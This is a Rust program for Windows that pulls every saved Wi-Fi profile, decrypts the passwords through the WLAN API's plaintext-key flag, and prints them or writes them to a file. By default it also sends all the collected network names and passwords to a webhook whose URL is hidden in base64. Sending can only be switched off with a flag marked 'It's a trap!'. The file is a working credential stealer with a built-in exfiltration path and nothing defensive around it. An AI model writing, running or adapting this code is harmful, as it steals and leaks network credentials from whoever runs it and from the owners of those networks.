use base64::{
    engine::general_purpose::{self},
    Engine as _,
};
use clap::Parser;
use reqwest;
use serde_json;
use std::fs::File;
use std::io;
use std::io::Write;
use tokio;

const WEBHOOK_URL: &str = "";

fn decode_webhook_url(webhook_url: &str) -> String {
    let decoded_bytes = general_purpose::STANDARD
        .decode(webhook_url)
        .expect("Failed to decode base64");
    String::from_utf8(decoded_bytes).expect("Failed to convert to UTF-8 string")
}

async fn send_to_webhook(message: &str, webhook_url: &str) -> Result<(), reqwest::Error> {
    let client = reqwest::Client::new();
    let payload = serde_json::json!({
        "content": message
    });

    let _res = client.post(webhook_url).json(&payload).send().await?;

    // println!("Webhook response status: {}", res.status());
    Ok(())
}

#[derive(Parser)]
#[command(version, about, long_about = None)]
struct Cli {
    /// Name of output file to save WiFi creds
    #[arg(short, long)]
    output: Option<String>,
    // /// Send results to webhook
    // #[arg(short, long)]
    // send: Option<String>,
    /// It's a trap!
    #[arg(short, long)]
    nosend: bool,
}

use std::{ffi::OsString, os::windows::ffi::OsStringExt};

use windows::{
    core::{GUID, HSTRING, PCWSTR, PWSTR},
    Data::Xml::Dom::{XmlDocument, XmlElement},
    Win32::{
        Foundation::{HANDLE, INVALID_HANDLE_VALUE, WIN32_ERROR},
        NetworkManagement::WiFi::{
            WlanCloseHandle, WlanEnumInterfaces, WlanFreeMemory, WlanGetProfile,
            WlanGetProfileList, WlanOpenHandle, WLAN_API_VERSION_2_0, WLAN_INTERFACE_INFO_LIST,
            WLAN_PROFILE_GET_PLAINTEXT_KEY, WLAN_PROFILE_INFO_LIST,
        },
    },
};

fn open_wlan_handle(api_version: u32) -> Result<HANDLE, windows::core::Error> {
    let mut negotiatied_version = 0;
    let mut wlan_handle = INVALID_HANDLE_VALUE;

    let result = unsafe {
        WlanOpenHandle(
            api_version,
            None,
            &mut negotiatied_version,
            &mut wlan_handle,
        )
    };

    WIN32_ERROR(result).ok()?;

    Ok(wlan_handle)
}

fn enum_wlan_interfaces(
    handle: HANDLE,
) -> Result<*mut WLAN_INTERFACE_INFO_LIST, windows::core::Error> {
    let mut interface_ptr = std::ptr::null_mut();

    let result = unsafe { WlanEnumInterfaces(handle, None, &mut interface_ptr) };

    WIN32_ERROR(result).ok()?;

    Ok(interface_ptr)
}

fn grab_interface_profiles(
    handle: HANDLE,
    interface_guid: &GUID,
) -> Result<*const WLAN_PROFILE_INFO_LIST, windows::core::Error> {
    let mut wlan_profiles_ptr = std::ptr::null_mut();

    let result =
        unsafe { WlanGetProfileList(handle, interface_guid, None, &mut wlan_profiles_ptr) };

    WIN32_ERROR(result).ok()?;

    Ok(wlan_profiles_ptr)
}

fn parse_utf16_slice(string_slice: &[u16]) -> Option<OsString> {
    let null_index = string_slice.iter().position(|c| c == &0)?;

    Some(OsString::from_wide(&string_slice[..null_index]))
}

fn load_xml_document(xml: &OsString) -> Result<XmlDocument, windows::core::Error> {
    let xml_document = XmlDocument::new()?;
    xml_document.LoadXml(&HSTRING::from(xml))?;
    Ok(xml_document)
}

fn traverse_xml_tree(xml: &XmlElement, node_path: &[&str]) -> Option<String> {
    let mut subtree_list = xml.ChildNodes().ok()?;
    let last_node_name = node_path.last()?;

    'node_traverse: for node in node_path {
        let node_name = OsString::from_wide(&node.encode_utf16().collect::<Vec<u16>>());
        for subtree_value in &subtree_list {
            let element_name = match subtree_value.NodeName() {
                Ok(name) => name,
                Err(_) => continue,
            };

            if element_name.to_os_string() == node_name {
                if element_name.to_os_string().to_string_lossy().to_string()
                    == last_node_name.to_string()
                {
                    return Some(subtree_value.InnerText().ok()?.to_string());
                }

                subtree_list = subtree_value.ChildNodes().ok()?;
                continue 'node_traverse;
            }
        }
    }

    None
}

fn get_profiles_xml(
    handle: HANDLE,
    interface_guid: &GUID,
    profile_name: &OsString,
) -> Result<OsString, windows::core::Error> {
    let mut profile_xml_data = PWSTR::null();
    let mut profile_get_flags = WLAN_PROFILE_GET_PLAINTEXT_KEY;

    let result = unsafe {
        WlanGetProfile(
            handle,
            interface_guid,
            PCWSTR(HSTRING::from(profile_name).as_ptr()),
            None,
            &mut profile_xml_data,
            Some(&mut profile_get_flags),
            None,
        )
    };

    WIN32_ERROR(result).ok()?;

    let xml_string = match unsafe { profile_xml_data.to_hstring() } {
        Ok(data) => data,
        Err(e) => {
            unsafe { WlanFreeMemory(profile_xml_data.as_ptr().cast()) };
            return Err(e);
        }
    };

    Ok(xml_string.to_os_string())
}

#[tokio::main]
async fn main() -> io::Result<()> {
    let cli = Cli::parse();

    let mut file = if let Some(ref output) = cli.output {
        Some(File::create(output)?)
    } else {
        None
    };

    println!("\nOutput Filename is: {:?}\n", cli.output);

    let mut webhook_var = if !cli.nosend {
        Some(String::new())
    } else {
        None
    };

    let wlan_handle = open_wlan_handle(WLAN_API_VERSION_2_0).expect("Failed to open WLAN handle!");

    let interface_ptr = match enum_wlan_interfaces(wlan_handle) {
        Ok(interfaces) => interfaces,
        Err(e) => {
            eprintln!("Failed to get the wireless interfaces: {:?}", e);
            unsafe { WlanCloseHandle(wlan_handle, None) };
            std::process::exit(1);
        }
    };

    let interfaces_list = unsafe {
        std::slice::from_raw_parts(
            (*interface_ptr).InterfaceInfo.as_ptr(),
            (*interface_ptr).dwNumberOfItems as usize,
        )
    };

    for interface_info in interfaces_list {
        let _interface_description =
            match parse_utf16_slice(interface_info.strInterfaceDescription.as_slice()) {
                Some(name) => name,
                None => {
                    eprintln!("Could not parse our interface description");
                    continue;
                }
            };

        let wlan_profile_ptr =
            match grab_interface_profiles(wlan_handle, &interface_info.InterfaceGuid) {
                Ok(profiles) => profiles,
                Err(_e) => {
                    eprintln!("Failed to retrieve profiles");
                    continue;
                }
            };

        let wlan_profile_list = unsafe {
            std::slice::from_raw_parts(
                (*wlan_profile_ptr).ProfileInfo.as_ptr(),
                (*wlan_profile_ptr).dwNumberOfItems as usize,
            )
        };

        for profile in wlan_profile_list {
            let profile_name = match parse_utf16_slice(&profile.strProfileName) {
                Some(name) => name,
                None => {
                    eprintln!("Could not parse profile name");
                    continue;
                }
            };

            let profile_xml_data =
                match get_profiles_xml(wlan_handle, &interface_info.InterfaceGuid, &profile_name) {
                    Ok(data) => data,
                    Err(_e) => {
                        eprintln!("Failed to extract XML data");
                        continue;
                    }
                };

            let xml_document = match load_xml_document(&profile_xml_data) {
                Ok(xml) => xml,
                Err(_e) => {
                    eprintln!("Failed to extract XML document");
                    continue;
                }
            };

            let root = match xml_document.DocumentElement() {
                Ok(root) => root,
                Err(_e) => {
                    eprintln!("Failed to get document root for profile XML");
                    continue;
                }
            };

            let auth_type = match traverse_xml_tree(
                &root,
                &["MSM", "security", "authEncryption", "authentication"],
            ) {
                Some(t) => t,
                None => {
                    eprintln!("Failed to get the auth type for this profile");
                    continue;
                }
            };

            match auth_type.as_str() {
                "open" => {
                    let output_string_open = format!(
                        "Wi-Fi Name: {}, No password\n",
                        profile_name.to_string_lossy().to_string()
                    );
                    print!("{}", output_string_open);
                    if let Some(ref mut var) = webhook_var {
                        var.push_str(&output_string_open);
                    }
                    if let Some(ref mut file) = file {
                        file.write_all(output_string_open.as_bytes())?;
                    }
                }
                "WPA2" | "WPA2PSK" | "WPA3SAE" => {
                    if let Some(password) =
                        traverse_xml_tree(&root, &["MSM", "security", "sharedKey", "keyMaterial"])
                    {
                        let output_string_wpa2_wpa3 = format!(
                            "Wi-Fi Name: {}, Authentication: {}, Password: {}\n",
                            profile_name.to_string_lossy().to_string(),
                            auth_type,
                            password
                        );
                        print!("{}", output_string_wpa2_wpa3);
                        if let Some(ref mut var) = webhook_var {
                            var.push_str(&output_string_wpa2_wpa3);
                        }
                        if let Some(ref mut file) = file {
                            file.write_all(output_string_wpa2_wpa3.as_bytes())?;
                        }
                    }
                }
                _ => {
                    let output_string_other = format!(
                        "Wi-Fi Name: {}, Authentication: {}\n",
                        profile_name.to_string_lossy().to_string(),
                        auth_type
                    );
                    print!("{}", output_string_other);
                    if let Some(ref mut var) = webhook_var {
                        var.push_str(&output_string_other);
                    }
                    if let Some(ref mut file) = file {
                        file.write_all(output_string_other.as_bytes())?;
                    }
                }
            }
        }
    }
    let webhook_url = decode_webhook_url(WEBHOOK_URL);

    if let Some(ref var) = webhook_var {
        send_to_webhook(var, &webhook_url).await.unwrap();
    }

    unsafe { WlanFreeMemory(interface_ptr.cast()) };
    unsafe { WlanCloseHandle(wlan_handle, None) };

    Ok(())
}
